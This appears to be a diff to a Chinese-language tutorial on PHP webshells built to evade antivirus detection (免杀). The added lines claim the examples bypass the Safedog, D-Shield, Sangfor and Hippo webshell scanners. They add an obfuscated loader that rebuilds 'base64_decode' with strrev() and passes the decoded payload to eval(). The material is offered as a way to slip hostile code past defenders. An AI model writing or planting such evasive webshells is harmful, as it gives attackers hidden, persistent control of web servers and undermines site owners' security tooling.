@@ -90,6 +90,8 @@ eval($e);
 
 ## 更多免杀payload
  - - -
+ >以下的例子均可以绕过绕过安全狗、D盾和深信服的客户端Webshell查杀和河马正式版的查杀。  
+ 
  ### strrev()函数
  `strrev()` 函数反转字符串。  
  ```php
@@ -97,9 +99,15 @@ eval($e);
 echo strrev("s9mf");
  ```
  输出:  
- ![12](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r4x9he8mj30cz056wez.jpg)
- 
-
+ ![12](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r4x9he8mj30cz056wez.jpg)  
+ 利用反转字符串的特性。  
+ ### code2
+ ```php
+ <?php
+$a = strrev('EdOcEd_46eSaB');  // base64_decode
+$b= $a('code');
+eval($b);
+ ```
 
 
 
